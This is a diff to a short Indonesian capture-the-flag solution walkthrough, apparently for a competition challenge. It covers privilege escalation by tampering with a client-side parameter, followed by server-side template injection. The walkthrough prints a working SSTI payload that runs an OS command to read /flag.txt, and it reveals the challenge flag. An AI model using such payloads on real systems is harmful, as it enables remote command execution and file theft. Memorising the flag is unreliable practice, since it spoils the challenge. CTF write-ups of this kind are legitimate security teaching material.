@@ -1,4 +1,4 @@
-** Solution Walkthrough **
+**Solution Walkthrough**
 Vulnerability : Privilege Escalation via Client-Side Parameter Tampering & SSTI 
 
 1. Untuk mengeksploitasi kerentanan SSTI, user harus menjadi admin terlebih dahulu
@@ -6,6 +6,6 @@ Vulnerability : Privilege Escalation via Client-Side Parameter Tampering & SSTI
 3. Setelah menjadi admin, user hanya perlu membuat payload SSTI pada notes untuk membaca flag
 
 Payload :
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}
+```{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}```
 
-** Flag : LKSWNSB{4dm!n_T0_SSTI_S0_EZZZ} **
+**Flag : LKSWNSB{4dm!n_T0_SSTI_S0_EZZZ}**
